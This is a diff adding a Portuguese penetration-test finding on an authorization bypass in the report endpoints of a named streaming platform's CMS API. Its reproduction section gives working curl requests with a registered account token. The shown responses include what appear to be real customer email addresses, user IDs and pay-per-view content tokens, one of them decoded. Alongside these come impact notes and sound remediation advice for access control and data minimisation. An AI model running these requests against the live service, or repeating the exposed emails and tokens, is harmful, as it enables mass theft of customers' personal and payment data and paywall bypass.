@@ -1,0 +1,110 @@
+# F-015 BOLA/authorization bypass em relatórios financeiros administrativos (CMS API)
+Alvo: https://cms.soultv.com.br/v1/PPV_Report/ e https://cms.soultv.com.br/v1/channel_report/
+Severidade: Crítica
+Timestamp: 2026-08-27T17:15:00Z
+Descoberto por: webapp (via análise do JS bundle ppv: `PPV_Report/?size=${n}&page=${r}` e `channel_report/?size=${n}&page=${r}`)
+
+## Sumário
+Os endpoints de relatório administrativo `POST /v1/PPV_Report/` e
+`POST /v1/channel_report/` exigem autenticação, mas **qualquer conta de
+assinante auto-registrada (F-013) tem acesso autorizado** — não há checagem
+de `is_staff`/permissão de admin. Como o signup é aberto e instantâneo
+(F-013, sem verificação de email/CAPTCHA), qualquer atacante obtém um token
+válido e imediatamente baixa relatórios financeiros completos contendo:
+emails de clientes, user_ids, canais/PPV assinados, preços, status de
+assinatura, datas de pagamento, transaction_id, stripe_subscription_id.
+
+Isto é ** Broken Access Control / authorization bypass** em endpoints
+claramente administrativos (nomes `*_Report`), acessíveis a assinante comum.
+
+## Reprodução
+Token obtido via signup aberto (F-013):
+`Authorization: Token afcbb9d2292e00bd67171fc4fbe3dbc2a9b3f86e`
+```
+$ curl -H "Authorization: Token <token-self-registered>" -H "Content-Type: application/json" \
+    -X POST -d '{"date_start":"2024-01-01","date_end":"2026-12-31"}' \
+    "https://cms.soultv.com.br/v1/PPV_Report/?size=100&page=1"
+
+{"success":true,"data":[
+  {"id":64777,"user":"edsonmareri4@gmail.com","deleted":false,
+   "created":"2026-08-27T15:15:03.288017","ppv_id":31,
+   "name":"O Caminho da Prosperidade","is_subscribed":true,"price":"0.00",
+   "coin":"R$","currency":"BRL",
+   "token":"RkFZTFdEUFZFXEdWZ0dIQkdBWUc6QVA8TFxAVW1E",
+   "channel_name":"","ppv_name":"O Caminho da Prosperidade",
+   "user_id":856424,"payment_date":"","transaction_id":""},
+  ...
+]}
+```
+```
+$ curl -H "Authorization: Token <token>" -H "Content-Type: application/json" \
+    -X POST -d '{"date_start":"2024-01-01","date_end":"2026-12-31"}' \
+    "https://cms.soultv.com.br/v1/channel_report/?size=100&page=1"
+
+{"success":true,"data":[
+  {"id":4891,"user":"amilcarfernandeslopo@gmail.com","deleted":false,
+   "created":"2025-11-24T21:53:10.831466","is_subscribed":true,"coin":"$",
+   "token":"tokenAndroid","channel_name":"Soul Lab Premium (DESATIVADO)",
+   "plan_selected":null,"stripe_subscription_id":null,
+   "user_id":790279,"payment_date":"","transaction_id":""},
+  ...
+]}
+```
+
+### Paginação
+`?size=100&page=1` retornou 100 registros (PPV_Report) e 42 (channel_report).
+Total de páginas não-testado (rate limiting OPSEC), mas a paginação
+`size=100&page=N` indica que toda a base histórica de transações é
+baixável. Combinando com `date_start`/`date_end` arbitrary, atacante
+extrai histórico financeiro completo do negócio.
+
+### Campos sensíveis vazados por transação
+| Campo                    | Sensível | Notas |
+|--------------------------|----------|-------|
+| user (email)             | SIM      | email do cliente pagante |
+| user_id                  | SIM      | correlaciona com F-014 (GET account/{id}) |
+| channel_name / ppv_name  | -        | produto assinado |
+| price / coin / currency  | SIM      | valor pago, moeda (R$, USD, BRL) |
+| is_subscribed            | SIM      | status da assinatura |
+| payment_date             | SIM      | data de pagamento |
+| transaction_id           | SIM      | ID de transação (gateway) |
+| stripe_subscription_id   | SIM      | ID de assinatura Stripe (quando não null) |
+| token                    | SIM      | token de conteúdo do cliente (base64 obfuscado) |
+| created                  | -        | timestamp |
+| deleted                  | -        | flag soft-delete |
+
+### Tokens de conteúdo vazados
+PPV_Report retorna um `token` base64 por cliente (ex.:
+`RkFZTFdEUFZFXEdWZ0dIQkdBWUc6QVA8TFxAVW1E`). Estes são tokens de acesso a
+conteúdo PPV (pay-per-view) — se decodificados/aceitos pelo player, permitem
+assistir conteúdo pago sem pagar. Decodificado:
+`FAYLEDPVE\GVgHBGAYG:AP<L\@UmD` (formato obfuscado semelhante ao
+`content_token` do signup F-013).
+
+## Impacto
+- **Crítico**: qualquer pessoa (após signup aberto gratuito) baixa histórico
+  financeiro completo de todos os clientes — violação massiva de
+  confidencialidade comercial + LGPD (dados de pagamento, Art. 7º).
+- Vazamento de `stripe_subscription_id` pode permitir manipulação de
+  assinaturas via Stripe API se outras credenciais vazarem.
+- `transaction_id` exposto facilita fraude/double-spending em gateways.
+- `token` de conteúdo por cliente = possível bypass de paywall PPV.
+- Permite análise competitiva (receita total, ticket médio, churn por canal)
+  via agregação dos relatórios.
+
+## Recomendação
+1. **Autorização por role**: `is_staff=true` obrigatório para qualquer
+   endpoint `*_Report` — checar `request.user.is_staff` no backend.
+2. Mover endpoints de relatório para namespace admin separado (ex.: `/v1/admin/reports/`)
+   com RBAC explícito (DRF `IsAdminUser` / `DjangoModelPermissions`).
+3. Adicionar auditoria/log de acesso a relatórios (quem acessou, quando).
+4. Invalidar/redesenhar `token` de conteúdo PPV — não deve ser exposto em
+   relatórios; usar referenciação indireta.
+5. Revisar se `stripe_subscription_id`/`transaction_id` precisam estar no
+   relatório — minimização de dados (LGPD Art. 6º, III).
+
+## Referências
+- JS: enum/js_bundles/ppv.soultv.com.br_main.*.js — `PPV_Report/?size=${n}&page=${r}` e `channel_report/?size=${n}&page=${r}`
+- Evidência de saída: enum/webapp/auth/ppv_report_p1.json (100 registros)
+- Evidência de saída: enum/webapp/auth/channel_report_p1.json (42 registros)
+- Pré-requisito: F-013 (signup aberto fornece o token)
